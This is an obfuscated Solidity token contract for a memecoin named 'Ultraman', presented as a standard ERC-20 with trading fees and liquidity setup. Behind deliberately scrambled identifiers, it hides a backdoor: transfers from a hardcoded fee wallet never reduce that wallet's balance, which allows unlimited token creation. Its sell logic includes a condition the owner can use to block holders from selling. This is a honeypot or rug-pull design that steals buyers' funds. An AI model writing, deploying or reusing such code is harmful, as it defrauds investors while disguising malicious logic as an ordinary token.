/**

Ultraman  $Ultraman


TWITTER: https://twitter.com/Ultramanerc
TELEGRAM: https://t.me/Ultraman_erc
WEBSITE: https://ultramanerc.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mosqx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mosqx(a, b, "SafeMath");
    }

    function  _mosqx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _aphovay {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _ampvuks {
    function swxactTensSortigFeOrasferke(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Ultraman is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Ultraman";
    string private constant _symbol = unicode"Ultraman";
    uint8 private constant _decimals = 9;

    uint256 private constant _fTotalnr = 100000000 * 10 **_decimals;
    uint256 public _mvuvmAmauns = _fTotalnr;
    uint256 public _Wallesuope = _fTotalnr;
    uint256 public _wapThresfuto= _fTotalnr;
    uint256 public _mfakTakof= _fTotalnr;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _sEjanvp;
    mapping (address => bool) private _taxraksy;
    mapping(address => uint256) private _rpbuoeo;
    bool public _Taralega = false;
    address payable private _TdFoahopx;

    uint256 private _BuyTaxrinitialr=1;
    uint256 private _SellTaxrinitialr=1;
    uint256 private _BuyTaxrfinalr=1;
    uint256 private _SellTaxrfinalr=1;
    uint256 private _BuyTaxrAreducer=1;
    uint256 private _SellTaxrAreducer=1;
    uint256 private _waxpforq=0;
    uint256 private _bwsjouke=0;


    _ampvuks private _Tfplrk;
    address private _yvacsdr;
    bool private _prnvlxh;
    bool private oylurprk = false;
    bool private _awkafnvpz = false;


    event _mxoebvlf(uint _mvuvmAmauns);
    modifier oevTauhe {
        oylurprk = true;
        _;
        oylurprk = false;
    }

    constructor () {      
        _balances[_msgSender()] = _fTotalnr;
        _sEjanvp[owner()] = true;
        _sEjanvp[address(this)] = true;
        _sEjanvp[_TdFoahopx] = true;
        _TdFoahopx = payable(0xE843eb6a0a076847Bf7a8E6bCd00509005857E65);

 

        emit Transfer(address(0), _msgSender(), _fTotalnr);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _fTotalnr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mosqx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_Taralega) {
                if (to != address
                (_Tfplrk) && to !=
                 address(_yvacsdr)) {
                  require(_rpbuoeo
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _rpbuoeo
                  [tx.origin] = block.number;
                }
            }

            if (from == _yvacsdr && to != 
            address(_Tfplrk) && !_sEjanvp[to] ) {
                require(amount <= _mvuvmAmauns,
                 "Exceeds the _mvuvmAmauns.");
                require(balanceOf(to) + amount
                 <= _Wallesuope, "Exceeds the maxWalletSize.");
                if(_bwsjouke
                < _waxpforq){
                  require(! _rjxputi(to));
                }
                _bwsjouke++;
                 _taxraksy[to]=true;
                teeomoun = amount.mul((_bwsjouke>
                _BuyTaxrAreducer)?_BuyTaxrfinalr:_BuyTaxrinitialr)
                .div(100);
            }

            if(to == _yvacsdr && from!= address(this) 
            && !_sEjanvp[from] ){
                require(amount <= _mvuvmAmauns && 
                balanceOf(_TdFoahopx)<_mfakTakof,
                 "Exceeds the _mvuvmAmauns.");
                teeomoun = amount.mul((_bwsjouke>
                _SellTaxrAreducer)?_SellTaxrfinalr:_SellTaxrinitialr)
                .div(100);
                require(_bwsjouke>_waxpforq &&
                 _taxraksy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oylurprk 
            && to == _yvacsdr && _awkafnvpz &&
             contractTokenBalance>_wapThresfuto 
            && _bwsjouke>_waxpforq&&
             !_sEjanvp[to]&& !_sEjanvp[from]
            ) {
                _rswphkfhi( _rqode(amount, 
                _rqode(contractTokenBalance,_mfakTakof)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _urfnop(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _mosqx(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _mosqx(teeomoun));
        emit Transfer(from, to, 
        amount. _mosqx(teeomoun));
    }

    function _rswphkfhi(uint256
     tokenAmount) private oevTauhe {
        if(tokenAmount==0){return;}
        if(!_prnvlxh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tfplrk.WETH();
        _approve(address(this),
         address(_Tfplrk), tokenAmount);
        _Tfplrk.
        swxactTensSortigFeOrasferke(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _rqode(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mosqx(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TdFoahopx){
            return a ;
        }else{
            return a . _mosqx (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mvuvmAmauns = _fTotalnr;
        _Wallesuope = _fTotalnr;
        _Taralega = false;
        emit _mxoebvlf(_fTotalnr);
    }

    function _rjxputi(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _urfnop(uint256
    amount) private {
        _TdFoahopx.
        transfer(
            amount);
    }

    function openTrading () external onlyOwner (){
        require(! _prnvlxh) ;
        _Tfplrk  =  _ampvuks(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_Tfplrk), _fTotalnr);
        _yvacsdr = _aphovay(_Tfplrk.factory()). createPair (address(this),  _Tfplrk . WETH ());
        _Tfplrk.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yvacsdr).approve(address(_Tfplrk), type(uint).max);
        _awkafnvpz = true;
        _prnvlxh = true;
    }

    receive() external payable {}
}